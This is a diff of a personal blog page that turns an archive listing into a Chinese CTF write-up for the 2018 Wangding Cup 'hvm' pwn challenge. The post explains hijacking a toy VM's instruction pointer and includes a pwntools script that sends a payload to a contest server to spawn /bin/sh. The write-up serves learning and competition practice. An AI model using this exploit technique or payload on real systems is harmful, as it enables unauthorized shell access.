@@ -8,20 +8,30 @@
 
 <title>
   
-    Archive: 2018/7
+    2018 网鼎杯预选赛第二场 hvm
   
 </title>
 
-<meta name="description" content="qq1015138407">
-<meta property="og:type" content="website">
-<meta property="og:title" content="pwndog&#39;s blog">
-<meta property="og:url" content="http://yoursite.com/archives/2018/07/index.html">
+<meta name="description" content="前言同学参赛给的题，侥幸做出来两道hvm和easpfmt。hvm是一道虚拟机题。正好我上学期期末设计做的是一款虚拟机软件。。虽然没开发完全还是懂一些。">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="2018 网鼎杯预选赛第二场 hvm">
+<meta property="og:url" content="http://yoursite.com/2018/08/22/2018-网鼎杯预选赛第二场-hvm/index.html">
 <meta property="og:site_name" content="pwndog&#39;s blog">
-<meta property="og:description" content="qq1015138407">
+<meta property="og:description" content="前言同学参赛给的题，侥幸做出来两道hvm和easpfmt。hvm是一道虚拟机题。正好我上学期期末设计做的是一款虚拟机软件。。虽然没开发完全还是懂一些。">
 <meta property="og:locale" content="CN">
+<meta property="og:image" content="http://yoursite.com/2018/08/22/2018-网鼎杯预选赛第二场-hvm/1.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/22/2018-网鼎杯预选赛第二场-hvm/4.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/22/2018-网鼎杯预选赛第二场-hvm/2.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/22/2018-网鼎杯预选赛第二场-hvm/3.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/22/2018-网鼎杯预选赛第二场-hvm/5.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/22/2018-网鼎杯预选赛第二场-hvm/6.png">
+<meta property="og:image" content="http://yoursite.com/2018/08/22/2018-网鼎杯预选赛第二场-hvm/7.png">
+<meta property="og:updated_time" content="2018-08-22T09:07:14.610Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwndog&#39;s blog">
-<meta name="twitter:description" content="qq1015138407">
+<meta name="twitter:title" content="2018 网鼎杯预选赛第二场 hvm">
+<meta name="twitter:description" content="前言同学参赛给的题，侥幸做出来两道hvm和easpfmt。hvm是一道虚拟机题。正好我上学期期末设计做的是一款虚拟机软件。。虽然没开发完全还是懂一些。">
+<meta name="twitter:image" content="http://yoursite.com/2018/08/22/2018-网鼎杯预选赛第二场-hvm/1.png">
 
 
   <link rel="alternative" href="/atom.xml" title="pwndog&#39;s blog" type="application/atom+xml">
@@ -155,226 +165,71 @@
       
         <div style="max-width: 1000px">
       
-          
-
+          <article id="post-2018-网鼎杯预选赛第二场-hvm" class="article article-type-post">
+  
+    <h1 class="article-header">
+      2018 网鼎杯预选赛第二场 hvm
+    </h1>
   
   
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <h1><a href="/archives/2018" class="archive-year">2018</a></h1>
-        </div>
-        <div class="post-list">
-    
-  
 
-    <div class="post-list-item article">
-      <h3 class="article-header">
-        <a href="/2018/07/29/一次Null-by-one的利用过程/" >
-  一次Null-by-one的利用过程
-</a>
-
-      </h3>
-      
-
-      <div class="article-info">
-        <a href="/2018/07/29/一次Null-by-one的利用过程/"><span class="article-date">
-  2018-07-29
+  <div class="article-info">
+    <span class="article-date">
+  2018-08-22
 </span>
-</a>
-        
 
-        
+    
+
+    
 	<span class="article-tag tagcloud">
 		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
 	</span>
 
 
-      </div>
-      <div class="article-entry">
-        
-          <p>学校比赛的压轴题。<br></p>
-          <p>
-            <a href="/2018/07/29/一次Null-by-one的利用过程/">
-              Read More
-            </a>
-          </p>
-        
-      </div>
-    </div>
+  </div>
+  <div class="article-entry">
+    <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>同学参赛给的题，侥幸做出来两道hvm和easpfmt。<br>hvm是一道虚拟机题。正好我上学期期末设计做的是一款虚拟机软件。。虽然没开发完全还是懂一些。<br><a id="more"></a></p>
+<h3 id="题目保护"><a href="#题目保护" class="headerlink" title="题目保护"></a>题目保护</h3><p><img src="/2018/08/22/2018-网鼎杯预选赛第二场-hvm/1.png" alt=""><br>除了got表可写全保护。</p>
+<h3 id="题目流程"><a href="#题目流程" class="headerlink" title="题目流程"></a>题目流程</h3><p>题目先随机mmap了一片内存用作之后保存虚拟机参数使用。<br>之后读取hvmbin的内容到刚才的地址。<br>之后进入简单的虚拟机解释循环。<br>通过运行程序，它的功能为输出hello，要求我们输入。输出bye<br><img src="/2018/08/22/2018-网鼎杯预选赛第二场-hvm/4.png" alt=""><br>读取的指令并不长我们可以单步追踪。发现它是通过syscall系统调用实现输入输出功能。将虚拟机寄存器保存为现实寄存器。<br><img src="/2018/08/22/2018-网鼎杯预选赛第二场-hvm/2.png" alt=""></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>我们重点关注输入的部分，唯一一次输入的机会。<br><img src="/2018/08/22/2018-网鼎杯预选赛第二场-hvm/3.png" alt=""><br>发现我们可以输入0xf0的字节。经过内存的查看。下面有一些可疑的参数<br><img src="/2018/08/22/2018-网鼎杯预选赛第二场-hvm/5.png" alt=""><br>直接输入0xf0个a尝试一下。会发现之后的虚拟机解释引擎的EIP使用一个计算被改变。计算为（0x65656565+3）&lt;&lt;2<br><img src="/2018/08/22/2018-网鼎杯预选赛第二场-hvm/6.png" alt=""><br>即我们可以修改它的虚拟机EIP指向我们的输入。加0xfffffffffffff000可以使EIP指向我们输入的伪造虚拟机指令。<br>覆盖偏移0x38为0xFdFbFfff即可。<br>通过对它构造参数的过程进行分析，得到如下结果<br>1-&gt;rax<br>4-&gt;rdx<br>构造rax为59，rdi指向binsh，rsi为0，rdx为0。<br>剩下rsi，rdi。通过对它27条指令的分析我们可以找到对rsi直接赋值的指令。<br>难点在于如何修改rdi指向bin/sh。<br>通过调试我们发现rsi会指向我们输入中的一个偏移。<br>且通过对27条指令的分析可以得到，存在两条指令，第一条可以将rsi赋值给一个中间变量。第二条可以将中间变量赋值给rdi。分别使26和0xd。<br>现在就可以实现构造rax为59，rdi指向binsh，rsi为0，rdx为0。<br>调用它虚拟机指令中的那条syscall（0xe）。完成利用。<br><img src="/2018/08/22/2018-网鼎杯预选赛第二场-hvm/7.png" alt=""></p>
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *
+p=remote(<span class="string">'117.50.4.173'</span>,<span class="number">10315</span>)
+context(log_level=<span class="string">'debug'</span>)
 
-  
+p.recvuntil(<span class="string">'hello'</span>)
+zz=raw_input()
 
-  
-  
+payload=<span class="string">'/bin/sh'</span>+chr(<span class="number">0</span>)+<span class="string">'a'</span>*<span class="number">0x28</span>+p32(<span class="number">0</span>)+p32(<span class="number">0xFdFbFfff</span>)+<span class="string">'/bin/sh'</span>+chr(<span class="number">0</span>)+p32(<span class="number">1</span>)+p32(<span class="number">0x3b000000</span>)+p32(<span class="number">4</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0xd</span>)+p32(<span class="number">26</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0xe</span>)
+p.sendline(payload)
+
+
+p.interactive()
+</code></pre>
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>第二场预选赛一共做出3道pwn。。帮同学。感觉难度不如第一场的。除了hvm其他两道难度。。有点太差</p>
+
+  </div>
+  <footer class="article-footer">
     
-  
-
-    <div class="post-list-item article">
-      <h3 class="article-header">
-        <a href="/2018/07/29/从pwnabke.tw第18题看free_hook覆盖/" >
-  从pwnabke.tw第18题看free_hook覆盖
-</a>
-
-      </h3>
+  <div class="cc">
+    <a href="http://creativecommons.org/licenses/by-sa/4.0/deed.C" target="_blank" title="Attribution-ShareAlike">
+      <img src="/images/cc/cc.png">
       
-
-      <div class="article-info">
-        <a href="/2018/07/29/从pwnabke.tw第18题看free_hook覆盖/"><span class="article-date">
-  2018-07-29
-</span>
-</a>
+          <img src="/images/cc/by.png">
         
+          <img src="/images/cc/sa.png">
+      
+      <span>
+        This work is licensed under a Creative Commons Attribution-ShareAlike 4.0 International License.
+      </span>
+    </a>
+  </div>
 
-        
-	<span class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
-	</span>
 
-
-      </div>
-      <div class="article-entry">
-        
-          <p>pwnabke.tw第18题 secret of my heart<br>开始发布在看雪上，现在搬到自己博客。<br>地址为<a href="https://pwnable.tw/challenge/" target="_blank" rel="noopener">https://pwnable.tw/challenge/</a><br></p>
-          <p>
-            <a href="/2018/07/29/从pwnabke.tw第18题看free_hook覆盖/">
-              Read More
-            </a>
-          </p>
-        
-      </div>
-    </div>
-
-  
-
-  
-  
     
-  
 
-    <div class="post-list-item article">
-      <h3 class="article-header">
-        <a href="/2018/07/27/0ctf-heapstorm笔记/" >
-  0ctf heapstorm笔记
-</a>
+  </footer>
+</article>
 
-      </h3>
-      
-
-      <div class="article-info">
-        <a href="/2018/07/27/0ctf-heapstorm笔记/"><span class="article-date">
-  2018-07-27
-</span>
-</a>
-        
-
-        
-	<span class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
-	</span>
-
-
-      </div>
-      <div class="article-entry">
-        
-          <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>最近找到了0CTF2018的原题，对旧题进行了重新的学习，记录一下在学习过程中遇到的问题和新的理解。<br>在做题中参照了sakura大神看雪上的writeup，<a href="https://bbs.pediy.com/thread-225973.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-225973.htm</a><br></p>
-          <p>
-            <a href="/2018/07/27/0ctf-heapstorm笔记/">
-              Read More
-            </a>
-          </p>
-        
-      </div>
-    </div>
-
-  
-
-  
-  
-    
-  
-
-    <div class="post-list-item article">
-      <h3 class="article-header">
-        <a href="/2018/07/25/CTF中的一点小疑惑/" >
-  CTF中的一点小疑惑
-</a>
-
-      </h3>
-      
-
-      <div class="article-info">
-        <a href="/2018/07/25/CTF中的一点小疑惑/"><span class="article-date">
-  2018-07-25
-</span>
-</a>
-        
-
-        
-	<span class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/CTF/">CTF</a></li></ul>
-	</span>
-
-
-      </div>
-      <div class="article-entry">
-        
-          <h3 id="关于top-chunk的问题笔记"><a href="#关于top-chunk的问题笔记" class="headerlink" title="关于top chunk的问题笔记"></a>关于top chunk的问题笔记</h3><p>覆盖TOP chunksize小于0x1000后，使top chunk脱落下来成为unsorted chunk的问题。<br>如将top chunk size覆盖为0xfa1,此时申请0x1000可以使top chunk变为unsorted chunk，不断申请0x90的chunk，最后会产生异常情况。</p>
-<h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><p>因为top chunk 小于0x90后不会放入unsorted bin，会放入fast bin 链表。。</p>
-
-        
-      </div>
-    </div>
-
-  
-
-  
-  
-    
-  
-
-    <div class="post-list-item article">
-      <h3 class="article-header">
-        <a href="/2018/07/24/malloc函数源码笔记/" >
-  malloc函数源码笔记
-</a>
-
-      </h3>
-      
-
-      <div class="article-info">
-        <a href="/2018/07/24/malloc函数源码笔记/"><span class="article-date">
-  2018-07-24
-</span>
-</a>
-        
-	<span class="article-category tagcloud">
-	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/glibc源码阅读/">glibc源码阅读</a></li></ul>
-	</span>
-
-
-        
-	<span class="article-tag tagcloud">
-		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/GLIBC/">GLIBC</a></li></ul>
-	</span>
-
-
-      </div>
-      <div class="article-entry">
-        
-          <h2 id="chunk类型分类"><a href="#chunk类型分类" class="headerlink" title="chunk类型分类"></a>chunk类型分类</h2><h3 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h3><p>在32位linux下当请求的空间小于0x64时使用fastbin分配，即申请出来的chunk size&lt;0x50时使用fastbin分配.<br>在32位linux下当请求的空间小于0x80时使用fastbin分配，即申请出来的chunk size&lt;0x90时使用fastbin分配.<br></p>
-          <p>
-            <a href="/2018/07/24/malloc函数源码笔记/">
-              Read More
-            </a>
-          </p>
-        
-      </div>
-    </div>
-
-  
 
 
 
